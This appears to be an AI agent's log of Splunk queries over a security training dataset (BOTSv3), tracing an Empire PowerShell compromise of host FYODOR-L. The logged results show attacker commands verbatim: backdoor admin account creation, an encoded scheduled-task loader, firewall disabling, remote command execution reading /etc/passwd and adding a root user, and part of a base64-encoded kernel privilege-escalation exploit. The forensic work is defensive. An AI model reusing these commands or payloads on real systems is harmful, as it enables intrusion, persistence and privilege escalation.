{"_time": "2018-08-20T18:03:15.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:20.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:26.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:32.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:37.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:43.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:14.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:21.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:28.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:33.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:39.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:04:45.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}], "meta": {"total_event_count": 3827, "returned": 50, "sid": "1790258631.1418", "truncated": "showing 25 of 3827 rows \u2014 the rest were not returned (too large); narrow the query to get a shorter answer", "clipped": "values longer than 1500 chars are cut; extract what you need with rex/eval to read the rest"}}


[STATE:agent_in]  step=3  msgs=36  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:01:55.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: The 443 connections are Empire C2 check-ins from an earlier agent. I need the specific port-3333 connection to see which process made the retrieval.



[STATE:verify_in]  step=4  msgs=37  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=4  msgs=37  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
          -> {"results": [{"_time": "2018-08-20T18:47:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "SourceIp": "192.168.70.186", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258641.1419"}}


[STATE:agent_in]  step=4  msgs=38  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:47:06.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: The port-3333 retrieval was made by the same Empire PowerShell process (C442...D901) that created hdoor.exe and the unziped\lsof-master tools. Now check for any child processes or command lines mentioning "logos" or the download/extract action around that time.



[STATE:verify_in]  step=5  msgs=39  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" \"logos\" | stats count by EventCode, _time, Image, ProcessGuid"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=5  msgs=39  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" \"logos\" | stats count by EventCode, _time, Image, ProcessGuid"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" \"logos\" | stats count by EventCode, _time, Image, ProcessGuid"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258650.1420"}}


[STATE:agent_in]  step=5  msgs=40  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258650.1420"}}'

[Agent thinking]
Intention: No Sysmon event mentions "logos" — the downloaded file's save path isn't captured there. Check whether the stream:http event carries a content_type or filename that confirms what was served, and look for any other feed mentioning logos.png on FYODOR-L.



[STATE:verify_in]  step=6  msgs=41  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=6  msgs=41  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
          -> {"results": [{"src_ip": "192.168.70.186", "dest_ip": "45.77.53.176", "site": "45.77.53.176:3333", "uri_path": "/images/logos.png", "http_method": "GET", "status": "200", "http_user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258655.1421"}}


[STATE:agent_in]  step=6  msgs=42  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [{"src_ip": "192.168.70.186", "dest_ip": "45.77.53.176", "site": "45.77.53.176:3333", "uri_path": "/images/l'

[Agent thinking]
Intention: The user agent confirms the retrieval was made by the same WindowsPowerShell process (matching the Empire agent). Now check whether any other feed (e.g., WinEventLog, osquery, code42) captured the file write of logos.png or the extraction, and verify no other download path exists on FYODOR-L around that time.



[STATE:verify_in]  step=7  msgs=43  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 19:00:00\" | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=7  msgs=43  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 19:00:00\" | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 19:00:00\" | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258663.1422"}}


[STATE:agent_in]  step=7  msgs=44  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258663.1422"}}'

[Agent thinking]
Intention: The time-bounded query returned 0 due to timezone rendering differences between tools. Instead, list all large downloads (>100KB) from FYODOR-L across the whole dataset to confirm no other file could have carried the tools.



[STATE:verify_in]  step=8  msgs=45  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" bytes_out>100000 | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=8  msgs=45  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" bytes_out>100000 | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" bytes_out>100000 | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
          -> {"results": [{"uri_path": "/assets/21A-ElSully-Compressed-e1444171682154.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "340666"}, {"uri_path": "/assets/AFest.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "232678"}, {"uri_path": "/assets/SVBW-540x139.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "115424"}, {"uri_path": "/assets/Website-Augustfest-Banner.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "882159"}, {"uri_path": "/assets/hhwbeerita7-540x675.jpg", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "107302"}, {"uri_path": "/files/large/0ee25704defc27c", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "119189"}, {"uri_path": "/files/large/2ce46da082c5f70", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "111026"}, {"uri_path": "/files/large/38a807a84063219", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "143385"}, {"uri_path": "/files/large/4c20bbfc4ba16aa", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "172979"}, {"uri_path": "/files/large/5a78c6ef73588a2", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "109129"}, {"uri_path": "/files/large/69af114eefb36c1", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "116710"}, {"uri_path": "/files/large/81b5332306a14a4", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "108461"}, {"uri_path": "/files/large/d75fdf23c23f1fe", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "472521"}, {"uri_path": "/files/large/dc428a1f662795c", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "144755"}, {"uri_path": "/files/large/ed4c0d16001dbd9", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "2034704"}, {"uri_path": "/files/large/f967185a13495f1", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "704958"}, {"uri_path": "/files/thumb/dab81985bead7d7/1900/400/fit", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "103339"}, {"uri_path": "/images/logos.png", "dest_ip": "45.77.53.176", "site": "45.77.53.176:3333", "status": "200", "count": "1", "total_bytes": "5542140"}, {"uri_path": "/js/300/addthis_widget.js", "dest_ip": "23.72.33.31", "site": "s7.addthis.com", "status": "200", "count": "1", "total_bytes": "114392"}, {"uri_path": "/site/wp-content/themes/dbb/lib/images/dbb_age_check_bg.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "323618"}, {"uri_path": "/site/wp-content/uploads/2013/07/10YrAnniPack-SocialMedia-MainBanner.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "432937"}, {"uri_path": "/site/wp-content/uploads/2013/07/PearLager-Main-banner-1.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "292601"}, {"uri_path": "/site/wp-content/uploads/2013/07/RRR_main-banner_1138x444.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "386490"}, {"uri_path": "/site/wp-content/uploads/2013/07/bcpatio_web.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "624384"}, {"uri_path": "/site/wp-content/uploads/2013/07/opaerial_web.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "338134"}, {"uri_path": "/site/wp-content/uploads/2014/07/BlackLager-6pkandbottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "164114"}, {"uri_path": "/site/wp-content/uploads/2014/09/GoldLeaf-6packandbottle-297x262-1.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "161638"}, {"uri_path": "/site/wp-content/uploads/2014/09/Vienna-6pkandbottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "166917"}, {"uri_path": "/site/wp-content/uploads/2014/09/main-background-texture.jpg", "dest_ip": "45.60.12.68", "site": "www.dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "141256"}, {"uri_path": "/site/wp-content/uploads/2014/10/16point-6pkandbottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "171386"}, {"uri_path": "/site/wp-content/uploads/2014/10/EightPoint-6pkBottleCan-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "172993"}, {"uri_path": "/site/wp-content/uploads/2015/05/Maibock-6pkBottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "178160"}, {"uri_path": "/site/wp-content/uploads/2015/05/TrailAngel-bottlesandcans-297x524.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "290339"}, {"uri_path": "/site/wp-content/uploads/2015/06/PearLager-6pkBottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "170016"}, {"uri_path": "/site/wp-content/uploads/2015/12/Danzig-6pkandbottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "170314"}, {"uri_path": "/site/wp-content/uploads/2016/07/Ofest-6pkBottle-297x262-1.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "177054"}, {"uri_path": "/site/wp-content/uploads/2017/09/Mile842-6pkBottle-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "169386"}, {"uri_path": "/site/wp-content/uploads/2017/10/FamilyPack-222x196.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "104571"}, {"uri_path": "/site/wp-content/uploads/2018/02/2018ReleaseCalendar-Web.jpg", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "258002"}, {"uri_path": "/site/wp-content/uploads/2018/03/ERA-4packandcan-297x262.png", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "count": "1", "total_bytes": "115018"}, {"uri_path": "/system/cms/themes/default/img/bands-bg.png", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "106287"}, {"uri_path": "/system/cms/themes/default/img/content_background.jpg", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "599898"}, {"uri_path": "/system/cms/themes/default/img/hvr-bg.png", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "count": "1", "total_bytes": "135845"}, {"uri_path": "/wp-content/themes/21st-amendment/css/fonts/YWFT-Absent-Grotesque-Bold.otf", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "count": "1", "total_bytes": "210879"}, {"uri_path": "/wp-content/uploads/2018/03/Canning-Video.mp4", "dest_ip": "162.144.189.172", "site": "www.weepingradish.com", "status": "206", "count": "1", "total_bytes": "34679246"}], "meta": {"total_event_count": 45, "returned": 45, "sid": "1790258671.1423"}}


[STATE:agent_in]  step=8  msgs=46  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [{"uri_path": "/assets/21A-ElSully-Compressed-e1444171682154.png", "dest_ip": "70.32.68.105", "site": "21st-'

[Agent thinking]
Intention: The complete >100KB download list (45 rows, all returned) shows logos.png from 45.77.53.176:3333 is the only retrieval from the attacker IP — everything else is legitimate brewery websites. Now rule out any archive-extension download on FYODOR-L, and find child processes of the Empire agent that performed the download/extraction.



[STATE:verify_in]  step=9  msgs=47  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" (uri_path=\"*.zip\" OR uri_path=\"*.rar\" OR uri_path=\"*.7z\" OR uri_path=\"*.gz\" OR uri_path=\"*.tar\" OR uri_path=\"*.exe\" OR uri_path=\"*.ps1\") | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=9  msgs=47  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" (uri_path=\"*.zip\" OR uri_path=\"*.rar\" OR uri_path=\"*.7z\" OR uri_path=\"*.gz\" OR uri_path=\"*.tar\" OR uri_path=\"*.exe\" OR uri_path=\"*.ps1\") | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" (uri_path=\"*.zip\" OR uri_path=\"*.rar\" OR uri_path=\"*.7z\" OR uri_path=\"*.gz\" OR uri_path=\"*.tar\" OR uri_path=\"*.exe\" OR uri_path=\"*.ps1\") | stats count, sum(bytes_out) as total_bytes by uri_path, dest_ip, site, status"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258684.1424"}}


[STATE:agent_in]  step=9  msgs=48  errors=0  empty=3  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258684.1424"}}'

[Agent thinking]
Intention: No archive or executable-extension downloads exist on FYODOR-L at all. Now find child processes spawned by the Empire agent (ParentProcessGuid = C442...D901) to see the download/extract commands that produced the unziped directory.



[STATE:verify_in]  step=10  msgs=49  errors=0  empty=3  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ParentProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=10  msgs=49  errors=0  empty=3  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ParentProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ParentProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine"})
          -> {"results": [{"_time": "2018-08-20T18:08:17.000+08:00", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "\"C:\\Windows\\system32\\net.exe\" user /add svcvnc Password123!", "count": "1"}, {"_time": "2018-08-20T18:08:35.000+08:00", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "\"C:\\Windows\\system32\\net.exe\" localgroup administrators svcvnc /add", "count": "1"}, {"_time": "2018-08-20T18:09:44.000+08:00", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "\"C:\\Windows\\system32\\schtasks.exe\" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\\\"\"", "count": "1"}, {"_time": "2018-08-20T18:16:39.000+08:00", "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "\"C:\\Windows\\system32\\whoami.exe\"", "count": "1"}, {"_time": "2018-08-20T18:16:54.000+08:00", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "\"C:\\Windows\\system32\\schtasks.exe\" /Delete /TN Updater /F", "count": "1"}, {"_time": "2018-08-20T18:40:57.000+08:00", "Image": "C:\\Windows\\System32\\NETSTAT.EXE", "CommandLine": "\"C:\\Windows\\system32\\NETSTAT.EXE\" -an", "count": "1"}, {"_time": "2018-08-20T18:41:46.000+08:00", "Image": "C:\\Windows\\System32\\NETSTAT.EXE", "CommandLine": "\"C:\\Windows\\system32\\NETSTAT.EXE\" -an", "count": "1"}, {"_time": "2018-08-20T18:43:10.000+08:00", "Image": "C:\\Windows\\Temp\\hdoor.exe", "CommandLine": "\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n", "count": "1"}, {"_time": "2018-08-20T18:46:29.000+08:00", "Image": "C:\\Windows\\System32\\netsh.exe", "CommandLine": "\"C:\\Windows\\system32\\netsh.exe\" advfirewall set allprofiles state off", "count": "1"}, {"_time": "2018-08-20T19:05:40.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami", "count": "1"}, {"_time": "2018-08-20T19:06:01.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action id", "count": "1"}, {"_time": "2018-08-20T19:06:20.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action groups", "count": "1"}, {"_time": "2018-08-20T19:06:38.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"cat /etc/passwd\"", "count": "1"}, {"_time": "2018-08-20T19:07:03.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com\"", "count": "1"}, {"_time": "2018-08-20T19:07:27.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"uname -a\"", "count": "1"}, {"_time": "2018-08-20T19:07:46.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"lsb_release -a\"", "count": "1"}, {"_time": "2018-08-20T19:08:36.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"echo LyoKICogVWJ1bnR1IDE2LjA0LjQga2VybmVsIHByaXYgZXNjCiAqCiAqIGFsbCBjcmVkaXRzIHRvIEBibGVpZGwKICogLSB2bmlrCiAqLwoKLy8gVGVzdGVkIG9uOgovLyA0LjQuMC0xMTYtZ2VuZXJpYyAjMTQwLVVidW50dSBTTVAgTW9uIEZlYiAxMiAyMToyMzowNCBVVEMgMjAxOCB4ODZfNjQKLy8gaWYgZGlmZmVyZW50IGtlcm5lbCBhZGp1c3QgQ1JFRCBvZmZzZXQgKyBjaGVjayBrZXJuZWwgc3RhY2sgc2l6ZQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8bGludXgvYnBmLmg+CiNpbmNsdWRlIDxsaW51eC91bmlzdGQuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy91bi5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPHN0ZGludC5oPgoKI2RlZmluZSBQSFlTX09GRlNFVCAweGZmZmY4ODAwMDAwMDAwMDAKI2RlZmluZSBDUkVEX09GRlNFVCAweDVmOAojZGVmaW5lIFVJRF9PRkZTRVQgNAojZGVmaW5lIExPR19CVUZfU0laRSA2NTUzNgojZGVmaW5lIFBST0dTSVpFIDMyOAoKaW50IHNvY2tldHNbMl07CmludCBtYXBmZCwgcHJvZ2ZkOwoKY2hhciAqX19wcm9nID0gCSJceGI0XHgwOVx4MDBceDAwXHhmZlx4ZmZceGZmXHhmZiIKCQkiXHg1NVx4MDlceDAyXHgwMFx4ZmZceGZmXHhmZlx4ZmYiCgkJIlx4YjdceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHgxOFx4MTlceDAwXHgwMFx4MDNceDAwXHgwMFx4MDAiCgkJIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHg5MVx4MDBceDAwXH